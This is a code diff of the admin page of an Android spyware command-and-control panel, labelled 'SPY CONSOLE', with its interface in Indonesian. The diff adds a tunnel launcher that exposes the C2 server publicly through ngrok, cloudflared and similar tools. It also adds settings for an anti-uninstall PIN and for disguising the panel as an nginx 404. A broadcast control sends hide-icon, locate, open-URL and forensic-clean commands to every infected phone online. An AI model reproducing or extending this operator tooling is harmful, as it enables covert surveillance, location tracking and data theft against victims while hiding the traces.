@@ -3,116 +3,180 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Admin — M4zk1pLaySpy</title>
+<title>Admin</title>
 <link rel="stylesheet" href="/static/css/style.css">
 </head>
 <body>
-<div class="shell">
-  <aside class="side">
-    <div class="brand"><img src="/static/img/garuda.svg" alt=""><div><b>M4ZK1PL4Y</b><span>SPY CONSOLE</span></div></div>
-    <nav class="nav">
-      <a href="/dashboard">▣ <span class="lbl">DASHBOARD</span></a>
-      <a href="/targets">◈ <span class="lbl">TARGET</span></a>
-      <a href="/build">⚙ <span class="lbl">BUILD APK</span></a>
-      <a href="/dumps">⇩ <span class="lbl">HASIL DUMP</span></a>
-      <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
-    </nav>
-    <div class="side-foot"><div id="clock">--:--:--</div><a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a></div>
-  </aside>
-  <main class="main">
-    <header class="top"><h2 class="glitch" data-t="ADMIN">ADMIN</h2>
-      <div class="spacer"></div><span class="pill on"><i class="led on"></i>SUPERUSER</span></header>
-
-    <div class="content">
-      <div class="grid g4">
-        <div class="card stat red"><div class="k">TARGET</div><div class="v" id="k1">0</div></div>
-        <div class="card stat green"><div class="k">ONLINE</div><div class="v" id="k2">0</div></div>
-        <div class="card stat amber"><div class="k">DUMP</div><div class="v" id="k3">0</div></div>
-        <div class="card stat"><div class="k">BUILD</div><div class="v" id="k4">0</div></div>
-      </div>
-
-      <div class="grid g2">
-        <div class="card"><div class="card-h"><b>PENGATURAN</b></div><div class="card-b">
-          <div class="field"><label>KUNCI LISENSI</label><div class="row">
-            <input class="inp" id="license" style="flex:1;letter-spacing:.2em">
-            <button class="btn sm amber" id="rotLic">ROTASI</button></div></div>
-          <div class="field"><label>URL C2 PUBLIK</label><input class="inp" id="c2" style="letter-spacing:0"></div>
-          <div class="grid g2">
-            <div class="field"><label>PIN ANTI-UNINSTALL</label><input class="inp" id="pin" style="letter-spacing:.2em"></div>
-            <div class="field"><label>DURASI SESI (JAM)</label><input class="inp" id="sess" type="number" min="1" max="720"></div>
-          </div>
-          <div class="grid g2">
-            <div class="field"><label>EMAIL KONTAK</label><input class="inp" id="email" style="letter-spacing:0"></div>
-            <div class="field"><label>NAMA TIM</label><input class="inp" id="team" style="letter-spacing:0"></div>
-          </div>
-          <div class="row"><button class="btn" id="save">SIMPAN</button>
-            <button class="btn sm ghost" id="rotSec">ROTASI SECRET</button></div>
-        </div></div>
-
-        <div class="card"><div class="card-h"><b>PEMBERSIHAN</b></div><div class="card-b">
-          <p style="font-size:11px;color:var(--dim);margin-bottom:12px">Tindakan permanen. Tidak bisa dibatalkan.</p>
-          <div class="row">
-            <button class="btn sm ghost" data-p="dumps">HAPUS DUMP</button>
-            <button class="btn sm ghost" data-p="builds">HAPUS BUILD</button>
-            <button class="btn sm ghost" data-p="targets">HAPUS TARGET</button>
-            <button class="btn sm ghost" data-p="audit">HAPUS AUDIT</button>
-            <button class="btn sm ghost" data-p="sessions">HAPUS SESI</button>
-          </div>
-          <div class="card-h" style="margin:18px -14px 0;border-top:1px solid var(--line);border-bottom:0">AUDIT LOG</div>
-          <div class="console" id="audit" style="margin-top:12px;height:200px"></div>
-        </div></div>
-      </div>
-    </div>
-  </main>
-</div>
+<div class="win" id="win"></div>
 <div class="toast-wrap" id="tw"></div>
-
 <script type="module">
-import { $, $$, api, post, patch, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
-markNav(); clock($('#clock'));
-$('#logout').onclick = async (e) => { e.preventDefault(); await post('/api/logout'); location.href = '/'; };
+import { $, api, post, patch, toast, esc, fmt, copy } from '/static/js/core.js';
+import { chrome, statusbar, svg, confirmBox } from '/static/js/ui.js';
+
+const win = $('#win');
+chrome(win, {
+  page: 'admin', title: 'Admin',
+  actions: [
+    '<button class="tbtn acc" id="save">' + svg('gear') + 'SIMPAN</button>',
+    '<button class="tbtn" id="rf">' + svg('reload') + 'REFRESH</button>',
+    '<button class="tbtn" id="bc">' + svg('bolt') + 'BROADCAST</button>',
+  ],
+});
+const body = document.createElement('div');
+body.className = 'body pad';
+win.appendChild(body);
+statusbar(win, '<span class="st"><b>&#9679;</b> ADMIN</span><span class="st" id="lic">&mdash;</span>' +
+  '<span class="st-r">v2.1.0</span>');
+
+body.innerHTML = `
+<div class="grid g2">
+  <div class="card" id="tunnel"><div class="card-h">${svg('tunnel')}TUNNEL PUBLIK</div>
+    <div class="card-b">
+      <div class="kv">
+        <div class="k">Status</div><div class="v" id="tSt">mati</div>
+        <div class="k">URL</div><div class="v" id="tUrl">&mdash;</div>
+        <div class="k">Engine</div><div class="v" id="tKind">&mdash;</div>
+        <div class="k">Tersedia</div><div class="v" id="tAv">&mdash;</div>
+      </div>
+      <div class="field" style="margin-top:8px"><label>ENGINE</label>
+        <select class="inp" id="tSel">
+          <option value="auto">AUTO (deteksi)</option><option value="cloudflared">cloudflared</option>
+          <option value="ngrok">ngrok</option><option value="bore">bore</option>
+          <option value="localx">localtunnel (npx)</option><option value="ssh">ssh localhost.run</option>
+        </select></div>
+      <div class="row"><button class="btn acc sm" id="tStart">NYALAKAN</button>
+        <button class="btn ghost sm" id="tStop">MATIKAN</button>
+        <button class="btn ghost sm" id="tCopy">SALIN</button></div>
+      <div class="console" id="tLog" style="height:92px;margin-top:7px"></div>
+    </div></div>
+
+  <div class="card"><div class="card-h">${svg('gear')}PENGATURAN</div>
+    <div class="card-b">
+      <div class="field"><label>LICENSE KEY</label><input class="inp" id="license_key"></div>
+      <div class="field"><label>C2 PUBLIC URL</label><input class="inp" id="c2_public_url" placeholder="https://..."></div>
+      <div class="field"><label>PIN ANTI-UNINSTALL</label><input class="inp" id="uninstall_pin"></div>
+      <div class="field"><label>DURASI SESI (JAM)</label>
+        <input class="inp" id="session_hours" type="number" min="1" max="720"></div>
+      <div class="field"><label>PORT / HOST</label>
+        <div class="row"><input class="inp" id="port" type="number" style="flex:1">
+        <input class="inp" id="host" style="flex:2"></div></div>
+      <label class="check"><input type="checkbox" id="require_license"> WAJIB LICENSE</label>
+      <label class="check"><input type="checkbox" id="hide_panel"> SEMBUNYIKAN PANEL (root = 404 nginx)</label>
+      <div class="row" style="margin-top:8px">
+        <button class="btn ghost sm" id="rotSec">ROTASI SECRET</button>
+        <button class="btn ghost sm" id="rotLic">ROTASI LICENSE</button></div>
+    </div></div>
+</div>
+
+<div class="grid g2">
+  <div class="card" id="broadcast"><div class="card-h">${svg('bolt')}BROADCAST</div>
+    <div class="card-b">
+      <div class="field"><label>PERINTAH</label>
+        <select class="inp" id="bcType">
+          <option value="ping">PING</option><option value="info">INFO</option>
+          <option value="toast">TOAST</option><option value="open_url">BUKA URL</option>
+          <option value="locate_once">LOKASI SEKALI</option><option value="vibrate">GETAR</option>
+          <option value="hide_icon">SEMBUNYIKAN IKON</option><option value="forensic_clean">FORENSIC CLEAN</option>
+        </select></div>
+      <div class="field"><label>ARGUMEN (text / url)</label><input class="inp" id="bcArg"></div>
+      <button class="btn acc sm" id="bcGo">KIRIM KE SEMUA ONLINE</button>
+      <div class="console" id="bcOut" style="height:70px;margin-top:7px"></div>
+    </div></div>
+  <div class="card"><div class="card-h">${svg('wipe')}PURGE</div>
+    <div class="card-b"><div class="chips">
+      <button class="chip" data-p="dumps">DUMP</button><button class="chip" data-p="builds">BUILD</button>
+      <button class="chip" data-p="targets">TARGET</button><button class="chip" data-p="audit">AUDIT</button>
+      <button class="chip" data-p="sessions">SESI</button></div>
+      <div class="console" id="audit" style="height:150px;margin-top:9px"></div></div></div>
+</div>`;
 
 async function load() {
-  const s = await api('/api/admin/settings');
-  const v = s.settings;
-  $('#license').value = v.license_key;
-  $('#c2').value = v.c2_public_url || '';
-  $('#pin').value = v.uninstall_pin;
-  $('#sess').value = v.session_hours;
-  $('#email').value = v.contact_email;
-  $('#team').value = v.contact_team;
-  const st = await api('/api/admin/stats');
-  $('#k1').textContent = st.targets; $('#k2').textContent = st.online;
-  $('#k3').textContent = st.dumps; $('#k4').textContent = st.builds;
-  const a = await api('/api/admin/audit');
-  $('#audit').innerHTML = a.audit.map((x) =>
-    `<div><span class="tm">${fmt.time(x.ts)}</span> <span class="wn">${esc(x.event)}</span> ${esc(x.detail)}</div>`).join('');
+  try {
+    const s = (await api('/api/admin/settings')).settings;
+    ['license_key', 'c2_public_url', 'uninstall_pin', 'session_hours', 'port', 'host']
+      .forEach((k) => { if ($('#' + k)) $('#' + k).value = s[k] ?? ''; });
+    $('#require_license').checked = !!s.require_license;
+    $('#hide_panel').checked = !!s.hide_panel;
+    $('#lic').textContent = 'license: ' + (s.license_key || '\u2014');
+    const a = await api('/api/admin/audit?limit=120');
+    $('#audit').innerHTML = a.audit.map((x) =>
+      '<div><span class="tm">' + fmt.time(x.ts) + '</span> <span class="cy">' +
+      esc(x.event) + '</span> ' + esc(x.detail) + '</div>').join('');
+  } catch (e) { toast(e.message, 'wn'); }
 }
 
 $('#save').onclick = async () => {
-  await patch('/api/admin/settings', {
-    license_key: $('#license').value.trim(),
-    c2_public_url: $('#c2').value.trim(),
-    uninstall_pin: $('#pin').value.trim(),
-    session_hours: Number($('#sess').value) || 24,
-    contact_email: $('#email').value.trim(),
-    contact_team: $('#team').value.trim(),
-  });
-  toast('Pengaturan disimpan.', 'ok');
+  const b = {};
+  ['license_key', 'c2_public_url', 'uninstall_pin', 'port', 'host']
+    .forEach((k) => { b[k] = $('#' + k).value; });
+  b.session_hours = Number($('#session_hours').value) || 24;
+  b.require_license = $('#require_license').checked;
+  b.hide_panel = $('#hide_panel').checked;
+  try { await patch('/api/admin/settings', b); toast('Disimpan.', 'ok'); load(); }
+  catch (e) { toast(e.message, 'wn'); }
+};
+$('#rotSec').onclick = async () => {
+  if (!await confirmBox('ROTASI SECRET', 'Agent lama harus reconnect. Lanjut?')) return;
+  await post('/api/admin/rotate-secret');
+  toast('Secret dirotasi.', 'ok');
 };
 $('#rotLic').onclick = async () => {
+  if (!await confirmBox('ROTASI LICENSE', 'License baru akan dibuat. Lanjut?')) return;
   const r = await post('/api/admin/rotate-license');
-  $('#license').value = r.license; toast('Lisensi baru: ' + r.license, 'ok');
+  toast('License baru: ' + r.license, 'ok');
+  load();
 };
-$('#rotSec').onclick = async () => { await post('/api/admin/rotate-secret'); toast('Secret dirotasi.', 'ok'); };
-$$('[data-p]').forEach((b) => {
+document.querySelectorAll('[data-p]').forEach((b) => {
   b.onclick = async () => {
-    if (!confirm('Hapus ' + b.dataset.p + '?')) return;
+    if (!await confirmBox('PURGE ' + b.dataset.p.toUpperCase(), 'Data dihapus permanen.')) return;
     await post('/api/admin/purge/' + b.dataset.p);
-    toast('Dibersihkan: ' + b.dataset.p, 'ok'); load();
+    toast('Purge selesai.', 'ok');
+    load();
   };
 });
-load();
+
+$('#bcGo').onclick = async () => {
+  const type = $('#bcType').value;
+  const arg = $('#bcArg').value;
+  const args = {};
+  if (arg) { args.text = arg; args.url = arg; }
+  try {
+    const r = await post('/api/targets/broadcast', { type, args });
+    $('#bcOut').prepend('<div><span class="tm">' + fmt.time(Date.now() / 1000) + '</span> ' +
+      type + ' \u2192 ' + r.sent + ' target</div>');
+    toast('Terkirim ke ' + r.sent + ' client.', 'ok');
+  } catch (e) { toast(e.message, 'wn'); }
+};
+$('#bc').onclick = () => $('#broadcast').scrollIntoView({ behavior: 'smooth' });
+
+async function tun() {
+  try {
+    const s = await api('/api/tunnel/status');
+    $('#tSt').textContent = s.on ? 'AKTIF' : 'mati';
+    $('#tSt').style.color = s.on ? 'var(--ok)' : 'var(--acc)';
+    $('#tUrl').textContent = s.url || '\u2014';
+    $('#tKind').textContent = s.kind || '\u2014';
+    $('#tAv').textContent = Object.entries(s.available || {})
+      .filter(([, v]) => v).map(([k]) => k).join(', ') || 'tidak ada';
+    $('#tLog').textContent = (s.log || []).slice(-9).join('\n');
+  } catch {}
+}
+$('#tStart').onclick = async () => {
+  try { await post('/api/tunnel/start', { kind: $('#tSel').value }); toast('Tunnel aktif.', 'ok'); }
+  catch (e) { toast(e.message, 'wn'); }
+  tun();
+};
+$('#tStop').onclick = async () => { await post('/api/tunnel/stop'); toast('Tunnel mati.'); tun(); };
+$('#tCopy').onclick = async () => {
+  const s = await api('/api/tunnel/status');
+  if (s.url) copy(s.url);
+};
+$('#rf').onclick = load;
+
+load(); tun();
+setInterval(tun, 5000);
+if (location.hash === '#tunnel') setTimeout(() => $('#tunnel').scrollIntoView(), 200);
+if (location.hash === '#broadcast') setTimeout(() => $('#broadcast').scrollIntoView(), 200);
 </script>
 </body>
 </html>
